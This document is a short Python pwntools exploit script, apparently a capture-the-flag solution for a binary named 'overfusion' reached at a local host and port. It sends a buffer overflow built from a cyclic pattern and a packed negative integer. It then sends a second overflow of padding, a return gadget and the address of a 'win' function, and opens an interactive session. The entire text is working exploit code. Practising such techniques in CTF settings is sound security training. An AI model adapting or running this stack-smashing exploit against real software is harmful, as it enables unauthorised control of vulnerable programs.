#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './overfusion')

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 10001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

io = start()
payload = cyclic(140)
# negative_value = -65534

negative_value = -65135
packed_negative_value = p64((1 << 64) + negative_value)

payload += packed_negative_value

io.sendlineafter(b"Enter your first person: ",payload)
# payload
print(payload)

payload=b"A"*152
# payload+=p64(0x000000000040101a)
payload+=p64(0x0000000000401016)
payload+=p64(exe.symbols.win)
io.sendlineafter(b"Enter your Second person: ",payload)

io.interactive()